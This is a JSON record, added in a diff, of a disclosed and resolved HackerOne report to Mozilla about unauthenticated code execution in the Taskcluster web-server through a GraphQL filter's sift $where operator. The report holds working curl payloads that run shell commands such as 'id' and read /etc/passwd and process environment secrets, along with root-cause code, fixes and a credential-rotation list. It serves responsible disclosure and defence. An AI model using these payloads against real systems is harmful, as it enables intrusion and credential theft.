@@ -1,0 +1,125 @@
+{
+  "id": 3782701,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgyNzAx",
+  "url": "https://hackerone.com/reports/3782701",
+  "title": "Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-04T18:21:22.296Z",
+  "submitted_at": "2026-06-04T18:21:24.144Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "griffinf",
+    "url": "/griffinf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/l1pj8azaqlm5gjvb9ocru5rfbfj8/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61236,
+    "url": "https://hackerone.com/mozilla",
+    "handle": "mozilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mozilla",
+      "twitter_handle": "",
+      "website": "https://www.mozilla.org",
+      "about": "Mozilla web bug bounty program specific to encouraging security research in Mozilla's products and web services."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-08-05T15:50:21.517Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-06T15:50:18.565Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe public GraphQL endpoint at `/graphql` allows an unauthenticated caller to execute arbitrary JavaScript inside the web-server's Node.js process. The query argument `filter` is a free-form JSON object that the server passes directly into the `sift` library. The version in use (`sift` 17.1.3) compiles a `$where` string into a function using `new Function` and executes it.\n\nCode execution has been confirmed, including the ability to run shell commands as the `node` user and read the full process environment. That environment contains PostgreSQL credentials, the Taskcluster deployment access token, Auth0 and GitHub OAuth client secrets, Pulse credentials, and database column-encryption keys. Exploiting this endpoint effectively compromises the entire instance, including the one running Firefox CI.\n\nNo authentication, token, or special headers are required. This can be exploited with a single POST request.\n\n## Technical Details\n\n### Root Cause Chain\n\n**1. The filter goes straight into sift.** From `services/web-server/src/utils/sift.js`:\n\n```js\nimport sift from 'sift';\nexport default (filter, array) => {\n  if (!array) return [];\n  return filter ? array.filter(sift(filter)) : array;\n};\n```\n\nWhatever JSON the client sends as `filter` becomes `sift(filter)` with the default operator set. Nothing is stripped or validated.\n\n**2. sift turns a `$where` string into code.** From `sift` 17.1.3:\n\n```js\nconst $where = (params, ownerQuery, options) => {\n  let test;\n  if (isFunction(params)) {\n    test = params;\n  } else if (!process.env.CSP_ENABLED) {\n    test = new Function(\"obj\", \"return \" + params);   // <-- string becomes code\n  } else {\n    throw new Error(`In CSP mode, sift does not support strings in \"$where\" condition`);\n  }\n  return new EqualsOperation((b) => test.bind(b)(b), ownerQuery, options);\n};\n```\n\n`CSP_ENABLED` is not set on the deployment (confirmed live: a string `$where` executes instead of throwing the CSP error), so any string passed is wrapped as `new Function(\"obj\", \"return \" + myString)` and called once for each element of the array being filtered.\n\n**3. The endpoint is anonymous and the resolver still runs.** `services/web-server/src/servers/credentials.js` calls `next()` when there is no `Authorization` header, allowing the request to continue as an anonymous caller. The `filter` reaches sift through the normal resolver and loader path, for example:\n\n```\nQuery.expandScopes(scopes, filter)\n  -> loaders/scopes.js : auth.expandScopes({ scopes })  then  sift(filter, expandedScopes)\n```\n\nThe same pattern exists for `roles`, `listRoleIds`, `hookGroups`, `hooks`, and `currentScopes`.\n\n**4. The anonymous role has the required scopes.** On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks:*`. The upstream call inside the loader succeeds for an anonymous caller, sift runs on the result, and the `$where` function fires.\n\nThe `expandScopes` resolver is the most reliable trigger. The upstream handler echoes back the `scopes` sent, so passing `[\"assume:anonymous\"]` guarantees a non-empty array without depending on any roles or hooks existing on the instance.\n\nThe thrown error message is returned to the client because `services/web-server/src/servers/formatError.js` forwards `err.message`, providing a clean output channel.\n\n## Steps To Reproduce\n\nAll requests are unauthenticated. No `Authorization` header is required.\n\n### 1. Prove code execution (harmless, computed marker)\n\n```bash\ncurl -s https://firefox-ci-tc.services.mozilla.com/graphql \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"query\":\"query($f:JSON){expandScopes(scopes:[\\\"assume:anonymous\\\"],filter:$f)}\",\"variables\":{\"f\":{\"$where\":\"(function(){throw new Error(\\\"RCE_\\\"+(6*7)+\\\"_\\\"+(typeof process))})()\"}}}'\n```\n\nResponse:\n\n```\n\"errors\":[{\"message\":\"RCE_42_object\", ... }]\n```\n\n`6*7` was computed on the server and `typeof process` is `object`, confirming this is running in the Node.js process, not parsed as data.\n\n### 2. Run a command\n\n```bash\ncurl -s https://firefox-ci-tc.services.mozilla.com/graphql \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"query\":\"query($f:JSON){expandScopes(scopes:[\\\"assume:anonymous\\\"],filter:$f)}\",\"variables\":{\"f\":{\"$where\":\"(function(){throw new Error(process.getBuiltinModule(\\\"child_process\\\").execSync(\\\"id\\\").toString())})()\"}}}'\n```\n\nResponse:\n\n```\nuid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n`cat /etc/passwd` over the same path returns:\n\n```\nroot:x:0:0:root:/root:/bin/sh\n...\nnode:x:1000:1000::/home/node:/bin/sh\nnginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin\n```\n\n### 3. Read the environment\n\nThe same technique reads `process.env`. Here is a redacted slice from `firefox-ci-tc`. Actual secret material has been stripped but enough structure is retained to show what is present:\n\n```\nNODE_ENV=production\nNODE_VERSION=24.15.0\nTASKCLUSTER_ROOT_URL=https://firefox-ci-tc.services.mozilla.com\nTASKCLUSTER_CLIENT_ID=static/taskcluster/web-server\nTASKCLUSTER_ACCESS_TOKEN=<redacted, 65 chars>\nREAD_DB_URL=postgresql://taskcluster_web_server:<redacted>@████████/taskcluster?ssl=1\nWRITE_DB_URL=postgresql://taskcluster_web_server:<redacted>@████████/taskcluster?ssl=1\nDB_CRYPTO_KEYS=[{\"algo\":\"aes-256\",\"id\":\"azure\",\"key\":\"<redacted>\"}]\nPULSE_USERNAME=firefoxcitc-taskcluster-web-server-v2\nPULSE_PASSWORD=<redacted, 32 chars>\nUI_LOGIN_STRATEGIES={\"mozilla-auth0\":{\"clientId\":\"████████\",\"clientSecret\":\"<redacted>\",\"domain\":\"auth.mozilla.auth0.com\"}}\nERROR_CONFIG={\"dsn\":\"https://<redacted>@o1069899.ingest.sentry.io/6459390\",\"reporter\":\"SentryReporter\"}\nSESSION_SECRET=FIXME\n```\n\n`community-tc` returns the equivalent set with its own database credentials, access token, Pulse password, and a GitHub OAuth `clientSecret`. On both instances `SESSION_SECRET` is the literal string `FIXME`.\n\nA self-contained Python proof of concept is available. `--check` performs the harmless confirmation in step 1 and is safe to run anywhere. `--cmd \"id\" --confirm` demonstrates command execution. `--dump-env --confirm` returns the environment, and `--target` points it at another instance.\n\n## Confirmed Instances\n\n- `firefox-ci-tc.services.mozilla.com` (primary target)\n- `community-tc.services.mozilla.com` (also confirmed vulnerable)\n\n## Impact\n\n## Impact\n\nThis is anonymous, internet-facing code execution on the deployment that builds Firefox. The environment variables exposed turn this into total compromise without any additional exploitation:\n\n### Immediate Access\n\n- **Database credentials**: `READ_DB_URL` and `WRITE_DB_URL` provide live PostgreSQL credentials for the Taskcluster database\n- **Deployment access token**: `TASKCLUSTER_ACCESS_TOKEN` is the web-server's own deployment client. Combined with database access, an attacker controls the entire Taskcluster instance\n- **OAuth secrets**: `UI_LOGIN_STRATEGIES` contains the Auth0 client secret on `firefox-ci-tc` and GitHub OAuth client secret on `community-tc`, enabling attacks on the login flow\n- **Broken session security**: `SESSION_SECRET` is set to `FIXME`, allowing session cookies to be forged offline independently of this vulnerability\n- **Database encryption keys**: `DB_CRYPTO_KEYS` decrypts encrypted database columns\n- **Message queue credentials**: `PULSE_PASSWORD` provides access to the Pulse message broker\n\n### Attack Surface\n\n- **Command execution as node user**: Full shell access inside the pod\n- **Internal network access**: The internal Kubernetes service network is reachable (`auth`, `queue`, `hooks`, `secrets`, `object`, `worker-manager` all resolve from the environment), providing a foothold for lateral movement\n- **API credential replay**: `TASKCLUSTER_ACCESS_TOKEN` authenticates as the `static/taskcluster/web-server` client and can be replayed directly against the Taskcluster API, including the secrets service at `/api/secrets/v1`\n\n### Scope of Compromise\n\nThis vulnerability has been validated on both `firefox-ci-tc` and `community-tc`. The impact chain is: one unauthenticated POST to `/graphql` → cluster-level credential access → full Taskcluster instance compromise.\n\n## Recommended Fixes\n\nIn order of preference:\n\n1. **Remove sift from untrusted input path**: Do not run sift on the raw `filter`. Map the GraphQL filter onto an allowlist of fields and comparison operators and apply filtering directly, or push filtering down to the upstream service\n2. **Restrict sift operations**: If sift must be used, build the query tester with a restricted operations set that excludes `$where`, and reject any `$`-prefixed key not explicitly supported before sift processes it\n3. **Input validation**: Reject `$where` at the validation layer and give `filter` a real input type instead of an open JSON scalar\n\nSetting `process.env.CSP_ENABLED` makes sift throw on a string `$where`, but this is a fragile mitigation, not a proper fix.\n\n### Additional Hardening\n\n- Set a proper `SESSION_SECRET` (currently `FIXME` in production)\n- Consider running the web-server under a sandbox that blocks spawning child processes, limiting the impact of future JavaScript execution vulnerabilities\n\n## Credential Rotation Required\n\nThe exact credential values were recovered during testing but have been intentionally excluded from this report to prevent their exposure to HackerOne and all parties with access to this ticket. All credentials are identifiable from the variable names provided above.\n\nTreat the entire web-server environment on both `firefox-ci-tc` and `community-tc` as compromised and rotate:\n\n- `WRITE_DB_URL` and `READ_DB_URL` (PostgreSQL user `taskcluster_web_server`)\n- `TASKCLUSTER_ACCESS_TOKEN` (client `static/taskcluster/web-server`)\n- `UI_LOGIN_STRATEGIES`: Auth0 `clientSecret` on `firefox-ci-tc`, GitHub OAuth `clientSecret` on `community-tc`\n- `DB_CRYPTO_KEYS` (aes-256, key id `azure`)\n- `PULSE_PASSWORD` (users `firefoxcitc-taskcluster-web-server-v2` / `communitytc-taskcluster-web-server-v2`)\n- `ERROR_CONFIG` Sentry DSNs\n- `SESSION_SECRET` (currently `FIXME`; set a real value)\n\nThe exact credential values can be provided over an encrypted channel if needed for verification purposes. SHA-256 fingerprints of any specific credential can be included in this report if proof of access is required.\n\n## Upstream Impact\n\nThis code exists in the `taskcluster` `main` branch, so any organization running Taskcluster is exposed. An upstream security advisory should accompany the fix.",
+  "bounty_amount": "12000.0",
+  "formatted_bounty": "$12,000",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-08-05T15:50:19.507Z",
+  "allow_singular_disclosure_after": -488.444201758,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "n1m0",
+    "dvtuan",
+    "felek",
+    "berrinbounty",
+    "l0bo",
+    "foxribeye",
+    "sottam",
+    "fearhunt",
+    "lvlary6m"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 635513,
+    "asset_type": "URL",
+    "asset_identifier": "firefox-ci-tc.services.mozilla.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
